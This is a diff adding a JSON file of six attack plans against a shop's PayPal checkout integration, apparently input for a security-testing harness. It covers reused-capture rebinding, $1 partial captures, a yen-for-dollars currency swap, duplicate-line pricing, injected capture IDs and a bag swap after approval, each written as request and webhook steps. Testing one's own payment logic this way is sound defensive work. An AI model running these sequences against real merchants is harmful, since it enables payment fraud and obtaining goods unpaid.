@@ -1,0 +1,192 @@
+{
+  "plans": [
+    {
+      "name": "Rebind old capture to big order",
+      "idea": "The webhook handler trusts resource.custom_id/invoice_id to choose the shop order and trusts the reused capture ID, without checking that PayPal's captured order, capture amount, or invoice actually belong to that shop order.",
+      "expect": "A new $147 order for 3 hoodies is fulfilled using only the earlier completed $49 capture for 1 hoodie.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders",
+          "body": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 3
+              }
+            ]
+          },
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "webhook",
+          "event": "PAYMENT.CAPTURE.COMPLETED",
+          "edit": {
+            "resource.custom_id": "{{a.body.orderId}}",
+            "resource.invoice_id": "{{a.body.orderId}}",
+            "resource.supplementary_data.related_ids.order_id": "{{a.body.id}}"
+          },
+          "signed": true,
+          "times": 1
+        }
+      ]
+    },
+    {
+      "name": "One-dollar partial capture",
+      "idea": "After approval for the full $49 PayPal order, the capture endpoint may forward a client-supplied capture amount to PayPal, or accept it locally, and then treat any COMPLETED capture as payment in full without comparing the captured amount with the shop order total.",
+      "expect": "Only $1.00 is captured, but the $49 hoodie order is fulfilled.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {},
+          "blockCapture": true,
+          "save": "b"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
+          "body": {
+            "amount": {
+              "currency_code": "USD",
+              "value": "1.00"
+            },
+            "final_capture": true
+          },
+          "times": 1,
+          "together": false
+        }
+      ]
+    },
+    {
+      "name": "Pay in yen, fulfil in dollars",
+      "idea": "The create-order endpoint may pass a client-supplied currency through to PayPal while the shop still compares only the numeric value 49.00 and fulfils as though 49 USD had been paid.",
+      "expect": "The buyer pays 49 JPY instead of $49.00 and receives the $49 hoodie.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {
+            "currency": "JPY",
+            "currency_code": "JPY",
+            "amount": {
+              "currency_code": "JPY",
+              "value": "49.00"
+            }
+          },
+          "blockCapture": false,
+          "save": "b"
+        }
+      ]
+    },
+    {
+      "name": "Duplicate lines, single charge",
+      "idea": "Pricing or PayPal item creation may deduplicate repeated SKUs by keeping or overwriting one line, while fulfilment may sum every submitted line; the normal bag never produces duplicate lines, so this split may be untested.",
+      "expect": "PayPal charges for 1 hoodie, but the fulfilled shop order contains 3 hoodies.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 1
+              },
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 1
+              },
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 1
+              }
+            ]
+          },
+          "blockCapture": false,
+          "save": "b"
+        }
+      ]
+    },
+    {
+      "name": "Inject old capture into new capture",
+      "idea": "The capture endpoint may trust captureId/status fields in its request body, or fetch the supplied capture and check only that it is COMPLETED, without binding that capture to the PayPal order in the path or to the new shop order.",
+      "expect": "A new unpaid $147 order for 3 hoodies is fulfilled by presenting the earlier $49 capture for a different order.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders",
+          "body": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 3
+              }
+            ]
+          },
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders/{{a.body.id}}/capture",
+          "body": {
+            "captureId": "{{legit.captureId}}",
+            "capture_id": "{{legit.captureId}}",
+            "id": "{{legit.captureId}}",
+            "status": "COMPLETED",
+            "paypalOrderId": "{{legit.paypalOrderId}}",
+            "orderId": "{{a.body.orderId}}",
+            "shopOrderId": "{{a.body.orderId}}"
+          },
+          "times": 1,
+          "together": false
+        }
+      ]
+    },
+    {
+      "name": "Swap the bag after approval",
+      "idea": "Capture may fulfil the session's or email's latest pending shop order rather than the shop order immutably bound to the PayPal order ID in the capture path, allowing the bag/order to be changed after approval but before capture.",
+      "expect": "The $49 capture approved for 1 hoodie fulfils the later $147 order for 3 hoodies.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {
+            "email": "swap@example.com"
+          },
+          "blockCapture": true,
+          "save": "b"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders",
+          "body": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 3
+              }
+            ],
+            "email": "swap@example.com"
+          },
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
+          "body": {},
+          "times": 1,
+          "together": false
+        }
+      ]
+    }
+  ]
+}
